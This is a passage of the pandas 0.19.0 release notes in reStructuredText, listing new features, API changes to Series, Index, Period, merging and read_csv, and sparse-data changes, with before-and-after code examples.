ipython:: python\n\n   s = [\"1\", 2, 3]\n   pd.to_numeric(s, downcast=\"unsigned\")\n   pd.to_numeric(s, downcast=\"integer\")\n\n.. _whatsnew_0190.dev_api:\n\npandas development API\n^^^^^^^^^^^^^^^^^^^^^^\n\nAs part of making pandas API more uniform and accessible in the future, we have created a standard\nsub-package of pandas, ``pandas.api`` to hold public API's. We are starting by exposing type\nintrospection functions in ``pandas.api.types``. More sub-packages and officially sanctioned API's\nwill be published in future versions of pandas (:issue:`13147`, :issue:`13634`)\n\nThe following are now part of this API:\n\n.. ipython:: python\n\n   import pprint\n   from pandas.api import types\n\n   funcs = [f for f in dir(types) if not f.startswith(\"_\")]\n   pprint.pprint(funcs)\n\n.. note::\n\n   Calling these functions from the internal module ``pandas.core.common`` will now show a ``DeprecationWarning`` (:issue:`13990`)\n\n\n.. _whatsnew_0190.enhancements.other:\n\nOther enhancements\n^^^^^^^^^^^^^^^^^^\n\n- ``Timestamp`` can now accept positional and keyword parameters similar to :func:`datetime.datetime` (:issue:`10758`, :issue:`11630`)\n\n  .. ipython:: python\n\n     pd.Timestamp(2012, 1, 1)\n\n     pd.Timestamp(year=2012, month=1, day=1, hour=8, minute=30)\n\n- The ``.resample()`` function now accepts a ``on=`` or ``level=`` parameter for resampling on a datetimelike column or ``MultiIndex`` level (:issue:`13500`)\n\n  .. ipython:: python\n\n     df = pd.DataFrame(\n         {\"date\": pd.date_range(\"2015-01-01\", freq=\"W\", periods=5), \"a\": np.arange(5)},\n         index=pd.MultiIndex.from_arrays(\n             [[1, 2, 3, 4, 5], pd.date_range(\"2015-01-01\", freq=\"W\", periods=5)],\n             names=[\"v\", \"d\"],\n         ),\n     )\n     df\n\n  .. code-block:: ipython\n\n     In [74]: df.resample(\"M\", on=\"date\")[[\"a\"]].sum()\n     Out[74]:\n                 a\n     date\n     2015-01-31  6\n     2015-02-28  4\n\n     [2 rows x 1 columns]\n\n     In [75]: df.resample(\"M\", level=\"d\")[[\"a\"]].sum()\n     Out[75]:\n                 a\n     d\n     2015-01-31  6\n     2015-02-28  4\n\n     [2 rows x 1 columns]\n\n- The ``.get_credentials()`` method of ``GbqConnector`` can now first try to fetch `the application default credentials <https://developers.google.com/identity/protocols/application-default-credentials>`__. See the docs for more details (:issue:`13577`).\n- The ``.tz_localize()`` method of ``DatetimeIndex`` and ``Timestamp`` has gained the ``errors`` keyword, so you can potentially coerce nonexistent timestamps to ``NaT``. The default behavior remains to raising a ``NonExistentTimeError`` (:issue:`13057`)\n- ``.to_hdf/read_hdf()`` now accept path objects (e.g. ``pathlib.Path``, ``py.path.local``) for the file path (:issue:`11773`)\n- The ``pd.read_csv()`` with ``engine='python'`` has gained support for the\n  ``decimal`` (:issue:`12933`), ``na_filter`` (:issue:`13321`) and the ``memory_map`` option (:issue:`13381`).\n- Consistent with the Python API, ``pd.read_csv()`` will now interpret ``+inf`` as positive infinity (:issue:`13274`)\n- The ``pd.read_html()`` has gained support for the ``na_values``, ``converters``, ``keep_default_na``  options (:issue:`13461`)\n- ``Categorical.astype()`` now accepts an optional boolean argument ``copy``, effective when dtype is categorical (:issue:`13209`)\n- ``DataFrame`` has gained the ``.asof()`` method to return the last non-NaN values according to the selected subset (:issue:`13358`)\n- The ``DataFrame`` constructor will now respect key ordering if a list of ``OrderedDict`` objects are passed in (:issue:`13304`)\n- ``pd.read_html()`` has gained support for the ``decimal`` option (:issue:`12907`)\n- ``Series`` has gained the properties ``.is_monotonic``, ``.is_monotonic_increasing``, ``.is_monotonic_decreasing``, similar to ``Index`` (:issue:`13336`)\n- ``DataFrame.to_sql()`` now allows a single value as the SQL type for all columns (:issue:`11886`).\n- ``Series.append`` now supports the ``ignore_index`` option (:issue:`13677`)\n- ``.to_stata()`` and ``StataWriter`` can now write variable labels to Stata dta files using a dictionary to make column names to labels (:issue:`13535`, :issue:`13536`)\n- ``.to_stata()`` and ``StataWriter`` will automatically convert ``datetime64[ns]`` columns to Stata format ``%tc``, rather than raising a ``ValueError`` (:issue:`12259`)\n- ``read_stata()`` and ``StataReader`` raise with a more explicit error message when reading Stata files with repeated value labels when ``convert_categoricals=True`` (:issue:`13923`)\n- ``DataFrame.style`` will now render sparsified MultiIndexes (:issue:`11655`)\n- ``DataFrame.style`` will now show column level names (e.g. ``DataFrame.columns.names``) (:issue:`13775`)\n- ``DataFrame`` has gained support to re-order the columns based on the values\n  in a row using ``df.sort_values(by='...', axis=1)`` (:issue:`10806`)\n\n  .. ipython:: python\n\n     df = pd.DataFrame({\"A\": [2, 7], \"B\": [3, 5], \"C\": [4, 8]}, index=[\"row1\", \"row2\"])\n     df\n     df.sort_values(by=\"row2\", axis=1)\n\n- Added documentation to :ref:`I/O<io.dtypes>` regarding the perils of reading in columns with mixed dtypes and how to handle it (:issue:`13746`)\n- :meth:`~DataFrame.to_html` now has a ``border`` argument to control the value in the opening ``<table>`` tag. The default is the value of the ``html.border`` option, which defaults to 1. This also affects the notebook HTML repr, but since Jupyter's CSS includes a border-width attribute, the visual effect is the same. (:issue:`11563`).\n- Raise ``ImportError`` in the sql functions when ``sqlalchemy`` is not installed and a connection string is used (:issue:`11920`).\n- Compatibility with matplotlib 2.0. Older versions of pandas should also work with matplotlib 2.0 (:issue:`13333`)\n- ``Timestamp``, ``Period``, ``DatetimeIndex``, ``PeriodIndex`` and ``.dt`` accessor have gained a ``.is_leap_year`` property to check whether the date belongs to a leap year. (:issue:`13727`)\n- ``astype()`` will now accept a dict of column name to data types mapping as the ``dtype`` argument. (:issue:`12086`)\n- The ``pd.read_json`` and ``DataFrame.to_json`` has gained support for reading and writing json lines with ``lines`` option see :ref:`Line delimited json <io.jsonl>` (:issue:`9180`)\n- :func:`read_excel` now supports the true_values and false_values keyword arguments (:issue:`13347`)\n- ``groupby()`` will now accept a scalar and a single-element list for specifying ``level`` on a non-``MultiIndex`` grouper. (:issue:`13907`)\n- Non-convertible dates in an excel date column will be returned without conversion and the column will be ``object`` dtype, rather than raising an exception (:issue:`10001`).\n- ``pd.Timedelta(None)`` is now accepted and will return ``NaT``, mirroring ``pd.Timestamp`` (:issue:`13687`)\n- ``pd.read_stata()`` can now handle some format 111 files, which are produced by SAS when generating Stata dta files (:issue:`11526`)\n- ``Series`` and ``Index`` now support ``divmod`` which will return a tuple of\n  series or indices. This behaves like a standard binary operator with regards\n  to broadcasting rules (:issue:`14208`).\n\n\n.. _whatsnew_0190.api:\n\nAPI changes\n~~~~~~~~~~~\n\n``Series.tolist()`` will now return Python types\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n``Series.tolist()`` will now return Python types in the output, mimicking NumPy ``.tolist()`` behavior (:issue:`10904`)\n\n\n.. ipython:: python\n\n   s = pd.Series([1, 2, 3])\n\n**Previous behavior**:\n\n.. code-block:: ipython\n\n   In [7]: type(s.tolist()[0])\n   Out[7]:\n    <class 'numpy.int64'>\n\n**New behavior**:\n\n.. ipython:: python\n\n   type(s.tolist()[0])\n\n.. _whatsnew_0190.api.series_ops:\n\n``Series`` operators for different indexes\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nFollowing ``Series`` operators have been changed to make all operators consistent,\nincluding ``DataFrame`` (:issue:`1134`, :issue:`4581`, :issue:`13538`)\n\n- ``Series`` comparison operators now raise ``ValueError`` when ``index`` are different.\n- ``Series`` logical operators align both ``index`` of left and right hand side.\n\n.. warning::\n   Until 0.18.1, comparing ``Series`` with the same length, would succeed even if\n   the ``.index`` are different (the result ignores ``.index``). As of 0.19.0, this will raises ``ValueError`` to be more strict. This section also describes how to keep previous behavior or align different indexes, using the flexible comparison methods like ``.eq``.\n\n\nAs a result, ``Series`` and ``DataFrame`` operators behave as below:\n\nArithmetic operators\n\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n\nArithmetic operators align both ``index`` (no changes).\n\n.. ipython:: python\n\n   s1 = pd.Series([1, 2, 3], index=list(\"ABC\"))\n   s2 = pd.Series([2, 2, 2], index=list(\"ABD\"))\n   s1 + s2\n\n   df1 = pd.DataFrame([1, 2, 3], index=list(\"ABC\"))\n   df2 = pd.DataFrame([2, 2, 2], index=list(\"ABD\"))\n   df1 + df2\n\nComparison operators\n\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n\nComparison operators raise ``ValueError`` when ``.index`` are different.\n\n**Previous behavior** (``Series``):\n\n``Series`` compared values ignoring the ``.index`` as long as both had the same length:\n\n.. code-block:: ipython\n\n   In [1]: s1 == s2\n   Out[1]:\n   A    False\n   B     True\n   C    False\n   dtype: bool\n\n**New behavior** (``Series``):\n\n.. code-block:: ipython\n\n   In [2]: s1 == s2\n   Out[2]:\n   ValueError: Can only compare identically-labeled Series objects\n\n.. note::\n\n   To achieve the same result as previous versions (compare values based on locations ignoring ``.index``), compare both ``.values``.\n\n   .. ipython:: python\n\n      s1.values == s2.values\n\n   If you want to compare ``Series`` aligning its ``.index``, see flexible comparison methods section below:\n\n   .. ipython:: python\n\n      s1.eq(s2)\n\n**Current behavior** (``DataFrame``, no change):\n\n.. code-block:: ipython\n\n   In [3]: df1 == df2\n   Out[3]:\n   ValueError: Can only compare identically-labeled DataFrame objects\n\nLogical operators\n\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n\nLogical operators align both ``.index`` of left and right hand side.\n\n**Previous behavior** (``Series``), only left hand side ``index`` was kept:\n\n.. code-block:: ipython\n\n   In [4]: s1 = pd.Series([True, False, True], index=list('ABC'))\n   In [5]: s2 = pd.Series([True, True, True], index=list('ABD'))\n   In [6]: s1 & s2\n   Out[6]:\n   A     True\n   B    False\n   C    False\n   dtype: bool\n\n**New behavior** (``Series``):\n\n.. ipython:: python\n\n   s1 = pd.Series([True, False, True], index=list(\"ABC\"))\n   s2 = pd.Series([True, True, True], index=list(\"ABD\"))\n   s1 & s2\n\n.. note::\n   ``Series`` logical operators fill a ``NaN`` result with ``False``.\n\n.. note::\n   To achieve the same result as previous versions (compare values based on only left hand side index), you can use ``reindex_like``:\n\n   .. ipython:: python\n\n      s1 & s2.reindex_like(s1)\n\n**Current behavior** (``DataFrame``, no change):\n\n.. ipython:: python\n\n   df1 = pd.DataFrame([True, False, True], index=list(\"ABC\"))\n   df2 = pd.DataFrame([True, True, True], index=list(\"ABD\"))\n   df1 & df2\n\nFlexible comparison methods\n\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n\n``Series`` flexible comparison methods like ``eq``, ``ne``, ``le``, ``lt``, ``ge`` and ``gt`` now align both ``index``. Use these operators if you want to compare two ``Series``\nwhich has the different ``index``.\n\n.. ipython:: python\n\n   s1 = pd.Series([1, 2, 3], index=[\"a\", \"b\", \"c\"])\n   s2 = pd.Series([2, 2, 2], index=[\"b\", \"c\", \"d\"])\n   s1.eq(s2)\n   s1.ge(s2)\n\nPreviously, this worked the same as comparison operators (see above).\n\n.. _whatsnew_0190.api.promote:\n\n``Series`` type promotion on assignment\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nA ``Series`` will now correctly promote its dtype for assignment with incompat values to the current dtype (:issue:`13234`)\n\n\n.. ipython:: python\n   :okwarning:\n\n   s = pd.Series()\n\n**Previous behavior**:\n\n.. code-block:: ipython\n\n   In [2]: s[\"a\"] = pd.Timestamp(\"2016-01-01\")\n\n   In [3]: s[\"b\"] = 3.0\n   TypeError: invalid type promotion\n\n**New behavior**:\n\n.. ipython:: python\n\n   s[\"a\"] = pd.Timestamp(\"2016-01-01\")\n   s[\"b\"] = 3.0\n   s\n   s.dtype\n\n.. _whatsnew_0190.api.to_datetime_coerce:\n\nFunction ``.to_datetime()`` changes\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nPreviously if ``.to_datetime()`` encountered mixed integers/floats and strings, but no datetimes with ``errors='coerce'`` it would convert all to ``NaT``.\n\n**Previous behavior**:\n\n.. code-block:: ipython\n\n   In [2]: pd.to_datetime([1, 'foo'], errors='coerce')\n   Out[2]: DatetimeIndex(['NaT', 'NaT'], dtype='datetime64[ns]', freq=None)\n\n**Current behavior**:\n\nThis will now convert integers/floats with the default unit of ``ns``.\n\n.. ipython:: python\n\n   pd.to_datetime([1, \"foo\"], errors=\"coerce\")\n\nBug fixes related to ``.to_datetime()``:\n\n- Bug in ``pd.to_datetime()`` when passing integers or floats, and no ``unit`` and ``errors='coerce'`` (:issue:`13180`).\n- Bug in ``pd.to_datetime()`` when passing invalid data types (e.g. bool); will now respect the ``errors`` keyword (:issue:`13176`)\n- Bug in ``pd.to_datetime()`` which overflowed on ``int8``, and ``int16`` dtypes (:issue:`13451`)\n- Bug in ``pd.to_datetime()`` raise ``AttributeError`` with ``NaN`` and the other string is not valid when ``errors='ignore'`` (:issue:`12424`)\n- Bug in ``pd.to_datetime()`` did not cast floats correctly when ``unit`` was specified, resulting in truncated datetime (:issue:`13834`)\n\n.. _whatsnew_0190.api.merging:\n\nMerging changes\n^^^^^^^^^^^^^^^\n\nMerging will now preserve the dtype of the join keys (:issue:`8596`)\n\n.. ipython:: python\n\n   df1 = pd.DataFrame({\"key\": [1], \"v1\": [10]})\n   df1\n   df2 = pd.DataFrame({\"key\": [1, 2], \"v1\": [20, 30]})\n   df2\n\n**Previous behavior**:\n\n.. code-block:: ipython\n\n   In [5]: pd.merge(df1, df2, how='outer')\n   Out[5]:\n      key    v1\n   0  1.0  10.0\n   1  1.0  20.0\n   2  2.0  30.0\n\n   In [6]: pd.merge(df1, df2, how='outer').dtypes\n   Out[6]:\n   key    float64\n   v1     float64\n   dtype: object\n\n**New behavior**:\n\nWe are able to preserve the join keys\n\n.. ipython:: python\n\n   pd.merge(df1, df2, how=\"outer\")\n   pd.merge(df1, df2, how=\"outer\").dtypes\n\nOf course if you have missing values that are introduced, then the\nresulting dtype will be upcast, which is unchanged from previous.\n\n.. ipython:: python\n\n   pd.merge(df1, df2, how=\"outer\", on=\"key\")\n   pd.merge(df1, df2, how=\"outer\", on=\"key\").dtypes\n\n.. _whatsnew_0190.api.describe:\n\nMethod ``.describe()`` changes\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nPercentile identifiers in the index of a ``.describe()`` output will now be rounded to the least precision that keeps them distinct (:issue:`13104`)\n\n.. ipython:: python\n\n   s = pd.Series([0, 1, 2, 3, 4])\n   df = pd.DataFrame([0, 1, 2, 3, 4])\n\n**Previous behavior**:\n\nThe percentiles were rounded to at most one decimal place, which could raise ``ValueError`` for a data frame if the percentiles were duplicated.\n\n.. code-block:: ipython\n\n   In [3]: s.describe(percentiles=[0.0001, 0.0005, 0.001, 0.999, 0.9995, 0.9999])\n   Out[3]:\n   count     5.000000\n   mean      2.000000\n   std       1.581139\n   min       0.000000\n   0.0%      0.000400\n   0.1%      0.002000\n   0.1%      0.004000\n   50%       2.000000\n   99.9%     3.996000\n   100.0%    3.998000\n   100.0%    3.999600\n   max       4.000000\n   dtype: float64\n\n   In [4]: df.describe(percentiles=[0.0001, 0.0005, 0.001, 0.999, 0.9995, 0.9999])\n   Out[4]:\n   ...\n   ValueError: cannot reindex from a duplicate axis\n\n**New behavior**:\n\n.. ipython:: python\n\n   s.describe(percentiles=[0.0001, 0.0005, 0.001, 0.999, 0.9995, 0.9999])\n   df.describe(percentiles=[0.0001, 0.0005, 0.001, 0.999, 0.9995, 0.9999])\n\nFurthermore:\n\n- Passing duplicated ``percentiles`` will now raise a ``ValueError``.\n- Bug in ``.describe()`` on a DataFrame with a mixed-dtype column index, which would previously raise a ``TypeError`` (:issue:`13288`)\n\n.. _whatsnew_0190.api.period:\n\n``Period`` changes\n^^^^^^^^^^^^^^^^^^\n\nThe ``PeriodIndex`` now has ``period`` dtype\n\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n\n``PeriodIndex`` now has its own ``period`` dtype. The ``period`` dtype is a\npandas extension dtype like ``category`` or the :ref:`timezone aware dtype <timeseries.timezone_series>` (``datetime64[ns, tz]``) (:issue:`13941`).\nAs a consequence of this change, ``PeriodIndex`` no longer has an integer dtype:\n\n**Previous behavior**:\n\n.. code-block:: ipython\n\n   In [1]: pi = pd.PeriodIndex(['2016-08-01'], freq='D')\n\n   In [2]: pi\n   Out[2]: PeriodIndex(['2016-08-01'], dtype='int64', freq='D')\n\n   In [3]: pd.api.types.is_integer_dtype(pi)\n   Out[3]: True\n\n   In [4]: pi.dtype\n   Out[4]: dtype('int64')\n\n**New behavior**:\n\n.. ipython:: python\n   :okwarning:\n\n   pi = pd.PeriodIndex([\"2016-08-01\"], freq=\"D\")\n   pi\n   pd.api.types.is_integer_dtype(pi)\n   pd.api.types.is_period_dtype(pi)\n   pi.dtype\n   type(pi.dtype)\n\n.. _whatsnew_0190.api.periodnat:\n\n``Period('NaT')`` now returns ``pd.NaT``\n\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n\nPreviously, ``Period`` has its own ``Period('NaT')`` representation different from ``pd.NaT``. Now ``Period('NaT')`` has been changed to return ``pd.NaT``. (:issue:`12759`, :issue:`13582`)\n\n**Previous behavior**:\n\n.. code-block:: ipython\n\n   In [5]: pd.Period('NaT', freq='D')\n   Out[5]: Period('NaT', 'D')\n\n**New behavior**:\n\nThese result in ``pd.NaT`` without providing ``freq`` option.\n\n.. ipython:: python\n\n   pd.Period(\"NaT\")\n   pd.Period(None)\n\n\nTo be compatible with ``Period`` addition and subtraction, ``pd.NaT`` now supports addition and subtraction with ``int``. Previously it raised ``ValueError``.\n\n**Previous behavior**:\n\n.. code-block:: ipython\n\n   In [5]: pd.NaT + 1\n   ...\n   ValueError: Cannot add integral value to Timestamp without freq.\n\n**New behavior**:\n\n.. ipython:: python\n\n   pd.NaT + 1\n   pd.NaT - 1\n\n``PeriodIndex.values`` now returns array of ``Period`` object\n\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n\n``.values`` is changed to return an array of ``Period`` objects, rather than an array\nof integers (:issue:`13988`).\n\n**Previous behavior**:\n\n.. code-block:: ipython\n\n   In [6]: pi = pd.PeriodIndex(['2011-01', '2011-02'], freq='M')\n   In [7]: pi.values\n   Out[7]: array([492, 493])\n\n**New behavior**:\n\n.. ipython:: python\n\n   pi = pd.PeriodIndex([\"2011-01\", \"2011-02\"], freq=\"M\")\n   pi.values\n\n\n.. _whatsnew_0190.api.setops:\n\nIndex ``+`` / ``-`` no longer used for set operations\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nAddition and subtraction of the base Index type and of DatetimeIndex\n(not the numeric index types)\npreviously performed set operations (set union and difference). This\nbehavior was already deprecated since 0.15.0 (in favor using the specific\n``.union()`` and ``.difference()`` methods), and is now disabled. When\npossible, ``+`` and ``-`` are now used for element-wise operations, for\nexample for concatenating strings or subtracting datetimes\n(:issue:`8227`, :issue:`14127`).\n\nPrevious behavior:\n\n.. code-block:: ipython\n\n   In [1]: pd.Index(['a', 'b']) + pd.Index(['a', 'c'])\n   FutureWarning: using '+' to provide set union with Indexes is deprecated, use '|' or .union()\n   Out[1]: Index(['a', 'b', 'c'], dtype='object')\n\n**New behavior**: the same operation will now perform element-wise addition:\n\n.. ipython:: python\n\n   pd.Index([\"a\", \"b\"]) + pd.Index([\"a\", \"c\"])\n\nNote that numeric Index objects already performed element-wise operations.\nFor example, the behavior of adding two integer Indexes is unchanged.\nThe base ``Index`` is now made consistent with this behavior.\n\n.. ipython:: python\n\n   pd.Index([1, 2, 3]) + pd.Index([2, 3, 4])\n\nFurther, because of this change, it is now possible to subtract two\nDatetimeIndex objects resulting in a TimedeltaIndex:\n\n**Previous behavior**:\n\n.. code-block:: ipython\n\n    In [1]: (pd.DatetimeIndex(['2016-01-01', '2016-01-02'])\n       ...:  - pd.DatetimeIndex(['2016-01-02', '2016-01-03']))\n    FutureWarning: using '-' to provide set differences with datetimelike Indexes is deprecated, use .difference()\n    Out[1]: DatetimeIndex(['2016-01-01'], dtype='datetime64[ns]', freq=None)\n\n**New behavior**:\n\n.. ipython:: python\n\n    (\n        pd.DatetimeIndex([\"2016-01-01\", \"2016-01-02\"])\n        - pd.DatetimeIndex([\"2016-01-02\", \"2016-01-03\"])\n    )\n\n\n.. _whatsnew_0190.api.difference:\n\n``Index.difference`` and ``.symmetric_difference`` changes\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n``Index.difference`` and ``Index.symmetric_difference`` will now, more consistently, treat ``NaN`` values as any other values. (:issue:`13514`)\n\n.. ipython:: python\n\n   idx1 = pd.Index([1, 2, 3, np.nan])\n   idx2 = pd.Index([0, 1, np.nan])\n\n**Previous behavior**:\n\n.. code-block:: ipython\n\n   In [3]: idx1.difference(idx2)\n   Out[3]: Float64Index([nan, 2.0, 3.0], dtype='float64')\n\n   In [4]: idx1.symmetric_difference(idx2)\n   Out[4]: Float64Index([0.0, nan, 2.0, 3.0], dtype='float64')\n\n**New behavior**:\n\n.. ipython:: python\n\n   idx1.difference(idx2)\n   idx1.symmetric_difference(idx2)\n\n.. _whatsnew_0190.api.unique_index:\n\n``Index.unique`` consistently returns ``Index``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n``Index.unique()`` now returns unique values as an\n``Index`` of the appropriate ``dtype``. (:issue:`13395`).\nPreviously, most ``Index`` classes returned ``np.ndarray``, and ``DatetimeIndex``,\n``TimedeltaIndex`` and ``PeriodIndex`` returned ``Index`` to keep metadata like timezone.\n\n**Previous behavior**:\n\n.. code-block:: ipython\n\n   In [1]: pd.Index([1, 2, 3]).unique()\n   Out[1]: array([1, 2, 3])\n\n   In [2]: pd.DatetimeIndex(['2011-01-01', '2011-01-02',\n      ...:                   '2011-01-03'], tz='Asia/Tokyo').unique()\n   Out[2]:\n   DatetimeIndex(['2011-01-01 00:00:00+09:00', '2011-01-02 00:00:00+09:00',\n                  '2011-01-03 00:00:00+09:00'],\n                 dtype='datetime64[ns, Asia/Tokyo]', freq=None)\n\n**New behavior**:\n\n.. ipython:: python\n\n   pd.Index([1, 2, 3]).unique()\n   pd.DatetimeIndex(\n       [\"2011-01-01\", \"2011-01-02\", \"2011-01-03\"], tz=\"Asia/Tokyo\"\n   ).unique()\n\n.. _whatsnew_0190.api.multiindex:\n\n``MultiIndex`` constructors, ``groupby`` and ``set_index`` preserve categorical dtypes\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n``MultiIndex.from_arrays`` and ``MultiIndex.from_product`` will now preserve categorical dtype\nin ``MultiIndex`` levels (:issue:`13743`, :issue:`13854`).\n\n.. ipython:: python\n\n   cat = pd.Categorical([\"a\", \"b\"], categories=list(\"bac\"))\n   lvl1 = [\"foo\", \"bar\"]\n   midx = pd.MultiIndex.from_arrays([cat, lvl1])\n   midx\n\n**Previous behavior**:\n\n.. code-block:: ipython\n\n   In [4]: midx.levels[0]\n   Out[4]: Index(['b', 'a', 'c'], dtype='object')\n\n   In [5]: midx.get_level_values[0]\n   Out[5]: Index(['a', 'b'], dtype='object')\n\n**New behavior**: the single level is now a ``CategoricalIndex``:\n\n.. ipython:: python\n\n   midx.levels[0]\n   midx.get_level_values(0)\n\nAn analogous change has been made to ``MultiIndex.from_product``.\nAs a consequence, ``groupby`` and ``set_index`` also preserve categorical dtypes in indexes\n\n.. ipython:: python\n\n   df = pd.DataFrame({\"A\": [0, 1], \"B\": [10, 11], \"C\": cat})\n   df_grouped = df.groupby(by=[\"A\", \"C\"], observed=False).first()\n   df_set_idx = df.set_index([\"A\", \"C\"])\n\n**Previous behavior**:\n\n.. code-block:: ipython\n\n   In [11]: df_grouped.index.levels[1]\n   Out[11]: Index(['b', 'a', 'c'], dtype='object', name='C')\n   In [12]: df_grouped.reset_index().dtypes\n   Out[12]:\n   A      int64\n   C     object\n   B    float64\n   dtype: object\n\n   In [13]: df_set_idx.index.levels[1]\n   Out[13]: Index(['b', 'a', 'c'], dtype='object', name='C')\n   In [14]: df_set_idx.reset_index().dtypes\n   Out[14]:\n   A      int64\n   C     object\n   B      int64\n   dtype: object\n\n**New behavior**:\n\n.. ipython:: python\n\n   df_grouped.index.levels[1]\n   df_grouped.reset_index().dtypes\n\n   df_set_idx.index.levels[1]\n   df_set_idx.reset_index().dtypes\n\n.. _whatsnew_0190.api.autogenerated_chunksize_index:\n\nFunction ``read_csv`` will progressively enumerate chunks\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWhen :func:`read_csv` is called with ``chunksize=n`` and without specifying an index,\neach chunk used to have an independently generated index from ``0`` to ``n-1``.\nThey are now given instead a progressive index, starting from ``0`` for the first chunk,\nfrom ``n`` for the second, and so on, so that, when concatenated, they are identical to\nthe result of calling :func:`read_csv` without the ``chunksize=`` argument\n(:issue:`12185`).\n\n.. ipython:: python\n\n   data = \"A,B\\n0,1\\n2,3\\n4,5\\n6,7\"\n\n**Previous behavior**:\n\n.. code-block:: ipython\n\n   In [2]: pd.concat(pd.read_csv(StringIO(data), chunksize=2))\n   Out[2]:\n      A  B\n   0  0  1\n   1  2  3\n   0  4  5\n   1  6  7\n\n**New behavior**:\n\n.. ipython:: python\n\n   pd.concat(pd.read_csv(StringIO(data), chunksize=2))\n\n.. _whatsnew_0190.sparse:\n\nSparse changes\n^^^^^^^^^^^^^^\n\nThese changes allow pandas to handle sparse data with more dtypes, and for work to make a smoother experience with data handling.\n\nTypes ``int64`` and ``bool`` support enhancements\n\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n\nSparse data structures now gained enhanced support of ``int64`` and ``bool`` ``dtype`` (:issue:`667`, :issue:`13849`).\n\nPreviously, sparse data were ``float64`` dtype by default, even if all inputs were of ``int`` or ``bool`` dtype. You had to specify ``dtype`` explicitly to create sparse data with ``int64`` dtype. Also, ``fill_value`` had to be specified explicitly because the default was ``np.nan`` which doesn't appear in ``int64`` or ``bool`` data.\n\n.. code-block:: ipython\n\n   In [1]: pd.SparseArray([1, 2, 0, 0])\n   Out[1]:\n   [1.0, 2.0, 0.0, 0.0]\n   Fill: nan\n   IntIndex\n   Indices: array([0, 1, 2, 3], dtype=int32)\n\n    specifying int64 dtype, but all values are stored in sp_values because\n    fill_value default is np.nan\n   In [2]: pd.SparseArray([1, 2, 0, 0], dtype=np.int64)\n   Out[2]:\n   [1, 2, 0, 0]\n   Fill: nan\n   IntIndex\n   Indices: array([0, 1, 2, 3], dtype=int32)\n\n   In [3]: pd.SparseArray([1, 2, 0, 0], dtype=np.int64, fill_value=0)\n   Out[3]:\n   [1, 2, 0, 0]\n   Fill: 0\n   IntIndex\n   Indices: array([0, 1], dtype=int32)\n\nAs of v0.19.0, sparse data keeps the input dtype, and uses more appropriate ``fill_value`` defaults (``0`` for ``int64`` dtype, ``False`` for ``bool`` dtype).\n\n.. ipython:: python\n\n   pd.arrays.SparseArray([1, 2, 0, 0], dtype=np.int64)\n   pd.arrays.SparseArray([True, False, False, False])\n\nSee the :ref:`docs <sparse.dtype>` for more details.\n\nOperators now preserve dtypes\n\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n\n- Sparse data structure now can preserve ``dtype`` after arithmetic ops (:issue:`13848`)\n\n.. code-block:: python\n\n   s = pd.SparseSeries([0, 2, 0, 1], fill_value=0, dtype=np.int64)\n   s.dtype\n\n   s + 1\n\n- Sparse data structure now support ``astype`` to convert internal ``dtype`` (:issue:`13900`)\n\n.. code-block:: python\n\n   s = pd.SparseSeries([1.0, 0.0, 2.0, 0.0], fill_value=0)\n   s\n   s.astype(np.int64)\n\n``astype`` fails if data contains values which cannot be converted to specified ``dtype``.\nNote that the limitation is applied to ``fill_value`` which default is ``np.nan``.\n\n.. code-block:: ipython\n\n   In [7]: pd.SparseSeries([1., np.nan, 2., np.nan], fill_value=np.nan).astype(np.int64)\n   Out[7]:\n   ValueError: unable to coerce current fill_value nan to int64 dtype\n\nOther sparse fixes\n\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n\n- Subclassed ``SparseDataFrame`` and ``SparseSeries`` now preserve class types when slicing or transposing. (:issue:`13787`)\n- ``SparseArray`` with ``bool`` dtype now supports logical (bool) operators (:issue:`14000`)\n- Bug in ``SparseSeries`` with ``MultiIndex`` ``[]`` indexing may raise ``IndexError`` (:issue:`13144`)\n- Bug in ``SparseSeries`` with ``MultiIndex`` ``[]`` indexing result may have normal ``Index`` (:issue:`13144`)\n- Bug in ``SparseDataFrame`` in which ``axis=None`` did not default to ``axis=0`` (:issue:`13048`)\n- Bug in ``SparseSeries`` and ``SparseDataFrame`` creation with ``object`` dtype may raise ``TypeError`` (:issue:`11633`)\n- Bug in ``SparseDataFrame`` doesn't respect passed ``SparseArray`` or ``SparseSeries`` 's dtype and ``fill_value``  (:issue:`13866`)\n- Bug in ``SparseArray`` and ``SparseSeries`` don't apply ufunc to ``fill_value`` 